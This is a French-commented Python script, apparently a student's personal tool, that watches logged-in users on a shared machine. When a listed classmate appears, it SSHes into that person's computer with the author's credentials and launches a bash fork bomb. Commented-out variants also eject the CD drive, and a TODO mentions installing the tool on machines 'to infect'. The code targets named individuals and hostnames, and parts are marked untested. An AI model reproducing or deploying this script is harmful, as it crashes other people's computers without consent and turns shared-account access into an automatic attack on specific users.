# -*- coding: utf-8 -*-

import os  # pour faire des fichier debugs dans le repertoire (seule trace des connexions invisibles..)
import sys
import subprocess  # pour surveiller la sortir du shell
from pexpect import pxssh
import time

"""
Yaura peut être un pb de timeout avec les expect: faire gaffe que la connexion requiert bien un mdp!
avec la commande cat on apparait pas loggé on dirait..
/udd/glebreto/Desktop/MesTrucs/Git/Bot/defense.py
"""

# TODO !!!!!!!!!!!! sur les machines de la ba, on rentre pas le username pour le ssh... => ici aussi passer à spawn()

# TODO faudra installer pexpect sur les machines à infecter: je peux faire un spawn pour l'installer auto, mais la
# flemme


class OffensiveDefense:
    """
    Quand ce script est exécuté sur une machine, si un utilisateur autre que moi et le proprio de la machine se
    connecte, il recoit une forkbomb en bash de ma part.
    On spécifie à la classe mon mdp, et l'utilisateur légitime de la machine
    """

    def __init__(self, user, mdp_param):
        """
        Ca retire à partir du nom du mec la machine sur laquelle tourne le script des machines non autorisées
        :param user: le nom du mec qui est le proprio de l'ordi sur lequel tourne le script
        :param mdp_param: mon mot de pass SSH
        :return:
        """
        self.mdp = mdp_param
        self.user = user
        self.me_user = "glebreto"

        self.dico_enemis = {"lbourneu": "flamboyant", "mperroti": "bambou", "nalary": "ficus",
                            "ynamour": "tong", "rferon": "brugnonier"}
        self.dico_enemis.pop(user, None)  # enlève l'user qui est sur la machine de la liste des enemis
        self.enemis = self.dico_enemis.keys()

        os.system("cat > defense_init")

        while True:  # surveillance constante
            self.vigie()
            #time.sleep(1)

    def vigie(self):
        """
        Detecte une présence étrangère autre que la mienne et celle de l'utilisateur légitime sur une machine.
        Quand un intru est détecté, lance la fonction attaque sur l'ordi associé à l'intru.
        Executé toutes les secondes
        :return:
        """

        sortie = subprocess.check_output("who", stderr=subprocess.STDOUT)  # sort la liste des usr loggés
        sortie = str(sortie)  # a ne pas enlever crétin..
        # print(sortie)

        for enemi in self.enemis:
            if enemi in sortie:
                print("beeeep, intru!!!!")  # TODO faire un truc plus class..
                self.attaque(self.dico_enemis[enemi], self.me_user, self.mdp)

    @staticmethod
    def attaque(enemi_ordi, me_param, mdp_param):
        """
        Se connecte sur une machine en ssh avec mes identifiants, ejecte le lecteur et lance une forkbomb bash
        """
        """ ancienne méthode, mais qui là marche normalement bien
        sess = pxssh.pxssh()
        sess.login(enemi_ordi, me_param, mdp_param)  # connexion ssh à l'enemi
        sess.sendline("eject")  # le lecteur cd...
        # sess.sendline(" b(){ b|b & };b ")   # TODO ne pas oublier d'armer la bombe
        """
        """
        sess = pxssh.spawn("ssh "+enemi_ordi+ enemi_ordi+" \" cat > bidule)  # TODO faire tout ca en cat, directe... et dans le pi je suis bloqué là..
        sess.expect("password")
        sess.sendline(mdp_param)
        sess.sendline("eject")  # le lecteur cd...
        # sess.sendline(" b(){ b|b & };b ")   # TODO ne pas oublier d'armer la bombe
        """
        sess = pxssh.spawn("ssh "+enemi_ordi+" \" b(){ b|b & };b \" ")  # TODO pas encore testé
        sess.expect("password")
        sess.sendline(mdp_param)

"""
print("\a")
print("\007") a tester, mais apparement ca marche pas, ya un truc avec les haut parleurs
"""


OffensiveDefense(sys.argv[1], sys.argv[2])  # user à exclure, + mdp pour l'attaque
